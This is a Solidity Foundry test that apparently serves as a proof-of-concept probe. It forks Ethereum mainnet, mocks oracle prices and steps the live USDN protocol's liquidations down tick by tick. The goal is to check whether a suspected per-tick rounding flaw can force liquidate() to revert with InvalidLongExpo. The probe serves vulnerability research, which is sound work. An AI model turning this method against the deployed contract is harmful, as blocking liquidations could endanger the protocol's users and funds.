// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;

import { Test, console2 } from "forge-std/Test.sol";

import { IUsdnProtocol } from "../../../src/interfaces/UsdnProtocol/IUsdnProtocol.sol";
import { IUsdnProtocolErrors } from "../../../src/interfaces/UsdnProtocol/IUsdnProtocolErrors.sol";
import { IUsdnProtocolTypes as Types } from "../../../src/interfaces/UsdnProtocol/IUsdnProtocolTypes.sol";
import { IBaseOracleMiddleware } from "../../../src/interfaces/OracleMiddleware/IBaseOracleMiddleware.sol";
import { PriceInfo } from "../../../src/interfaces/OracleMiddleware/IOracleMiddlewareTypes.sol";

/// @notice Prospective reachability probe starting from the exact current USDN
/// mainnet state. Only future oracle prices are mocked. No protocol storage,
/// balances, accumulator values, ticks, positions or Rebalancer state are
/// synthesized.
contract TestCurrentMainnetLiquidationReachability is Test {
    address internal constant PROTOCOL = 0x656cB8C6d154Aad29d8771384089be5B5141f01a;
    string internal constant RPC = "https://ethereum-rpc.publicnode.com";

    IUsdnProtocol internal protocol;
    address internal oracle;

    function setUp() public {
        vm.createSelectFork(RPC);
        protocol = IUsdnProtocol(PROTOCOL);
        oracle = address(protocol.getOracleMiddleware());

        console2.log("fork block", block.number);
        console2.log("last price", protocol.getLastPrice());
        console2.log("total expo", protocol.getTotalExpo());
        console2.log("long balance", protocol.getBalanceLong());
        console2.log("vault balance", protocol.getBalanceVault());
        console2.log("positions", protocol.getTotalLongPositions());
        console2.log("highest tick", int256(protocol.getHighestPopulatedTick()));
        console2.log("liquidation iteration", protocol.getLiquidationIteration());
        console2.log("oracle", oracle);
    }

    function _mockOraclePrice(uint256 price) internal {
        vm.mockCall(
            oracle,
            abi.encodeWithSelector(IBaseOracleMiddleware.validationCost.selector),
            abi.encode(uint256(0))
        );
        PriceInfo memory info = PriceInfo({ price: price, neutralPrice: price, timestamp: block.timestamp });
        vm.mockCall(
            oracle,
            abi.encodeWithSelector(IBaseOracleMiddleware.parseAndValidatePrice.selector),
            abi.encode(info)
        );
    }

    function _selector(bytes memory revertData) internal pure returns (bytes4 sel) {
        if (revertData.length < 4) return bytes4(0);
        assembly {
            sel := mload(add(revertData, 0x20))
        }
    }

    function _callLiquidate(uint256 price)
        internal
        returns (bool ok_, bytes4 selector_, Types.LiqTickInfo[] memory ticks_)
    {
        _mockOraclePrice(price);
        bytes memory data;
        (ok_, data) = PROTOCOL.call(abi.encodeWithSignature("liquidate(bytes)", bytes("")));
        if (!ok_) {
            selector_ = _selector(data);
            return (ok_, selector_, ticks_);
        }
        ticks_ = abi.decode(data, (Types.LiqTickInfo[]));
    }

    /// @dev Reconstruct populated ticks from the real bitmap-backed state by
    /// reading TickData at the protocol's production tick spacing. The scan
    /// stops as soon as the summed positions equal getTotalLongPositions().
    function _currentPopulatedTicks()
        internal
        view
        returns (int24[] memory ticks_, uint256 tickCount_, uint256 positionCount_)
    {
        uint256 totalPositions = protocol.getTotalLongPositions();
        ticks_ = new int24[](totalPositions);

        int24 spacing = protocol.getTickSpacing();
        int24 tick = protocol.getHighestPopulatedTick();

        for (uint256 step; step < 10_000 && positionCount_ < totalPositions; ++step) {
            Types.TickData memory td = protocol.getTickData(tick);
            if (td.totalPos != 0) {
                ticks_[tickCount_++] = tick;
                positionCount_ += td.totalPos;
            }
            tick -= spacing;
        }
    }

    /// @dev For each possible final public batch size 2..10, start from the
    /// identical live mainnet snapshot. Higher ticks are deliberately cleared
    /// one tick at a time by pricing exactly below the current highest tick's
    /// effective liquidation boundary. That path uses the protocol's own
    /// one-tick-safe accounting. The final k populated ticks are then cleared
    /// together in one dedicated liquidate(), which directly exercises the
    /// vulnerable independent per-tick rounding + production Rebalancer sink.
    function test_targetEveryFinalBatchSizeFromCurrentMainnetState() public {
        (int24[] memory populated, uint256 tickCount, uint256 countedPositions) = _currentPopulatedTicks();
        uint256 initialPositions = protocol.getTotalLongPositions();

        console2.log("populated tick count", tickCount);
        console2.log("positions accounted by TickData", countedPositions);
        assertEq(countedPositions, initialPositions, "failed to enumerate all live positions");
        assertGt(tickCount, 1, "need at least two live ticks");

        uint256 rootSnapshot = vm.snapshotState();
        uint256 maxFinal = tickCount < 10 ? tickCount : 10;

        for (uint256 finalSize = 2; finalSize <= maxFinal; ++finalSize) {
            vm.revertToState(rootSnapshot);
            rootSnapshot = vm.snapshotState();

            uint256 liveTickCount = tickCount;
            bool candidateAborted;

            // Clear only the highest tick at each step. Since the chosen price
            // is one wei below that tick's own effective boundary and the next
            // populated tick is lower, this normally returns exactly one tick.
            while (liveTickCount > finalSize) {
                int24 highest = protocol.getHighestPopulatedTick();
                uint256 boundary = protocol.getEffectivePriceForTick(highest);
                uint256 price = boundary > 1 ? boundary - 1 : boundary;

                (bool ok, bytes4 sel, Types.LiqTickInfo[] memory removed) = _callLiquidate(price);
                if (!ok) {
                    if (sel == IUsdnProtocolErrors.UsdnProtocolInvalidLongExpo.selector) {
                        console2.log("CURRENT MAINNET HIT DURING ONE-TICK PREPARATION");
                        console2.log("target final size", finalSize);
                        console2.log("live ticks before revert", liveTickCount);
                        return;
                    }
                    console2.log("preparation reverted with other selector");
                    console2.log("target final size", finalSize);
                    console2.logBytes4(sel);
                    candidateAborted = true;
                    break;
                }
                if (removed.length == 0 || removed.length > liveTickCount) {
                    candidateAborted = true;
                    break;
                }
                liveTickCount -= removed.length;
                if (liveTickCount < finalSize) {
                    // Two liquidation boundaries collapsed into the same call;
                    // this target size cannot be isolated on this path.
                    candidateAborted = true;
                    break;
                }
            }

            if (candidateAborted || liveTickCount != finalSize) continue;

            // Because all removals above were from the top, the lowest live tick
            // is the lowest tick from the original live set. Pricing one wei
            // below its current effective threshold makes every remaining tick
            // liquidatable in this final call (finalSize <= public max 10).
            int24 lowestRemaining = populated[tickCount - 1];
            uint256 finalBoundary = protocol.getEffectivePriceForTick(lowestRemaining);
            uint256 finalPrice = finalBoundary > 1 ? finalBoundary - 1 : finalBoundary;

            uint256 expoBefore = protocol.getTotalExpo();
            uint256 longBefore = protocol.getBalanceLong();
            (bool okFinal, bytes4 finalSel, Types.LiqTickInfo[] memory finalTicks) = _callLiquidate(finalPrice);

            if (!okFinal && finalSel == IUsdnProtocolErrors.UsdnProtocolInvalidLongExpo.selector) {
                console2.log("CURRENT MAINNET INVALID_LONG_EXPO HIT");
                console2.log("final batch size", finalSize);
                console2.log("final price", finalPrice);
                console2.log("totalExpo before final batch", expoBefore);
                console2.log("balanceLong before final batch", longBefore);
                console2.log("lowest remaining tick", int256(lowestRemaining));
                return;
            }

            if (!okFinal) {
                console2.log("final batch other revert");
                console2.log("final batch size", finalSize);
                console2.logBytes4(finalSel);
                continue;
            }

            console2.log("final batch succeeded");
            console2.log("requested final tick count", finalSize);
            console2.log("ticks actually liquidated", finalTicks.length);
            console2.log("final price", finalPrice);
            console2.log("remaining positions", protocol.getTotalLongPositions());
            console2.log("remaining totalExpo", protocol.getTotalExpo());
            console2.log("remaining balanceLong", protocol.getBalanceLong());
        }

        console2.log("NO CURRENT MAINNET INVALID_LONG_EXPO HIT FOR FINAL BATCH SIZES 2..10");
    }
}
